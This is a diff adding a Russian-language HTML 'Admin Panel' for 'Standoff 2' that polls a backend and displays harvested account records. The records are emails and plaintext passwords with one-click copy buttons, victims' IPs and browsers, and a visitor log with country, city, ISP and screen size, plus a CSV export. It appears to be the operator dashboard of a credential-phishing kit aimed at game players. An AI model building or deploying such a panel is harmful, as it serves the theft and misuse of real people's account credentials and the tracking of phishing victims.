@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="favicon.png" type="image/png">
+    <title>Admin Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a10;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            padding: 24px;
+            min-height: 100vh;
+        }
+        h1 {
+            font-size: 24px;
+            color: #ffd700;
+            margin-bottom: 6px;
+        }
+        .subtitle {
+            font-size: 13px;
+            color: #667;
+            margin-bottom: 24px;
+        }
+        .toolbar {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+        .btn {
+            background: #1a1a28;
+            color: #ffd700;
+            border: 1px solid #ffd70033;
+            padding: 10px 18px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .btn:hover {
+            background: #2a2a3a;
+            border-color: #ffd700;
+        }
+        .btn-red { color: #ff6666; border-color: #ff666633; }
+        .btn-red:hover { border-color: #ff6666; background: #2a1a1a; }
+
+        .stats {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+        }
+        .stat {
+            background: linear-gradient(145deg, #14141e, #1c1c2a);
+            border: 1px solid #ffd70022;
+            border-radius: 16px;
+            padding: 16px 20px;
+            min-width: 140px;
+        }
+        .stat-num {
+            font-size: 28px;
+            font-weight: 900;
+            color: #ffd700;
+        }
+        .stat-label {
+            font-size: 12px;
+            color: #778;
+            margin-top: 4px;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+            border-bottom: 1px solid #222;
+        }
+        .tab {
+            padding: 10px 20px;
+            background: transparent;
+            border: none;
+            color: #667;
+            font-size: 14px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            font-weight: 600;
+        }
+        .tab.active {
+            color: #ffd700;
+            border-bottom-color: #ffd700;
+        }
+
+        .panel { display: none; }
+        .panel.active { display: block; }
+
+        .table-wrap {
+            width: 100%;
+            overflow-x: auto;
+            border-radius: 14px;
+            background: #14141e;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+            min-width: 700px;
+        }
+        th {
+            background: #1f1f2e;
+            color: #ffd700;
+            padding: 12px;
+            text-align: left;
+            font-weight: 600;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+        }
+        td {
+            padding: 10px 12px;
+            border-bottom: 1px solid #1e1e2a;
+            color: #ccc;
+            word-break: break-word;
+        }
+        tr:hover td { background: #1a1a28; }
+        .empty {
+            text-align: center;
+            padding: 40px;
+            color: #445;
+        }
+        .copy-btn {
+            background: #222;
+            color: #ffd700;
+            border: none;
+            padding: 4px 8px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 11px;
+            margin-left: 6px;
+        }
+        .copy-btn:hover { background: #333; }
+        .badge {
+            display: inline-block;
+            background: #ffd70022;
+            color: #ffd700;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .ua-cell {
+            max-width: 200px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        @media (max-width: 600px) {
+            body { padding: 12px; }
+            h1 { font-size: 18px; }
+            .stat { min-width: 100px; padding: 12px; }
+            .stat-num { font-size: 22px; }
+        }
+    </style>
+</head>
+<body>
+    <h1>🔐 Admin Panel</h1>
+    <div class="subtitle">Standoff 2 — панель управления</div>
+
+    <div class="stats">
+        <div class="stat">
+            <div class="stat-num" id="statAccounts">0</div>
+            <div class="stat-label">Аккаунтов</div>
+        </div>
+        <div class="stat">
+            <div class="stat-num" id="statVisitors">0</div>
+            <div class="stat-label">Посетителей</div>
+        </div>
+        <div class="stat">
+            <div class="stat-num" id="statLast">—</div>
+            <div class="stat-label">Последний ID</div>
+        </div>
+    </div>
+
+    <div class="toolbar">
+        <button class="btn" onclick="loadData()">⟳ Обновить</button>
+        <a class="btn" href="/api/export">⬇ Скачать CSV</a>
+    </div>
+
+    <div class="tabs">
+        <button class="tab active" onclick="switchTab('accounts', this)">👤 Аккаунты</button>
+        <button class="tab" onclick="switchTab('visitors', this)">🌍 Посетители</button>
+    </div>
+
+    <div id="panel-accounts" class="panel active">
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Почта</th>
+                        <th>Пароль</th>
+                        <th>IP</th>
+                        <th>Браузер</th>
+                        <th>Время</th>
+                    </tr>
+                </thead>
+                <tbody id="accountsBody">
+                    <tr><td colspan="6" class="empty">Загрузка...</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <div id="panel-visitors" class="panel">
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>IP</th>
+                        <th>Страна</th>
+                        <th>Город</th>
+                        <th>Провайдер</th>
+                        <th>Экран</th>
+                        <th>Время</th>
+                    </tr>
+                </thead>
+                <tbody id="visitorsBody">
+                    <tr><td colspan="7" class="empty">Загрузка...</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        let data = { accounts: [], visitors: [] };
+
+        function switchTab(name, el) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+            el.classList.add('active');
+            document.getElementById('panel-' + name).classList.add('active');
+        }
+
+        async function loadData() {
+            try {
+                const r = await fetch('/api/data');
+                if (!r.ok) throw new Error('Auth');
+                data = await r.json();
+                render();
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        function esc(s) {
+            return String(s || '').replace(/[&<>"']/g, c => ({
+                '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+            }[c]));
+        }
+
+        function render() {
+            const ab = document.getElementById('accountsBody');
+            if (!data.accounts.length) {
+                ab.innerHTML = '<tr><td colspan="6" class="empty">Пока нет аккаунтов</td></tr>';
+            } else {
+                ab.innerHTML = data.accounts.map((a, i) => `
+                    <tr>
+                        <td>${i + 1}</td>
+                        <td>${esc(a.email)}<button class="copy-btn" onclick="copy('${esc(a.email)}')">⧉</button></td>
+                        <td>${esc(a.password)}<button class="copy-btn" onclick="copy('${esc(a.password)}')">⧉</button></td>
+                        <td>${esc((a.ip || '').replace('::ffff:', ''))}</td>
+                        <td class="ua-cell" title="${esc(a.user_agent || '')}">${esc((a.user_agent || '').substring(0, 60))}...</td>
+                        <td>${esc(a.time)}</td>
+                    </tr>
+                `).join('');
+            }
+
+            const vb = document.getElementById('visitorsBody');
+            if (!data.visitors.length) {
+                vb.innerHTML = '<tr><td colspan="7" class="empty">Пока нет посетителей</td></tr>';
+            } else {
+                vb.innerHTML = data.visitors.map((v, i) => `
+                    <tr>
+                        <td>${i + 1}</td>
+                        <td>${esc((v.ip || '').replace('::ffff:', ''))}</td>
+                        <td>${esc(v.country) || '<span class="badge">?</span>'}</td>
+                        <td>${esc(v.city) || '—'}</td>
+                        <td>${esc((v.org || '').substring(0, 40))}</td>
+                        <td>${esc(v.screen)}</td>
+                        <td>${esc(v.time)}</td>
+                    </tr>
+                `).join('');
+            }
+
+            document.getElementById('statAccounts').textContent = data.accounts.length;
+            document.getElementById('statVisitors').textContent = data.visitors.length;
+            if (data.accounts[0]) {
+                document.getElementById('statLast').textContent = '#' + data.accounts[0].id;
+            } else if (data.visitors[0]) {
+                document.getElementById('statLast').textContent = '#' + data.visitors[0].id;
+            }
+        }
+
+        function copy(text) {
+            try {
+                navigator.clipboard.writeText(text);
+            } catch (e) {}
+        }
+
+        loadData();
+        setInterval(loadData, 10000);
+    </script>
+</body>
+</html>
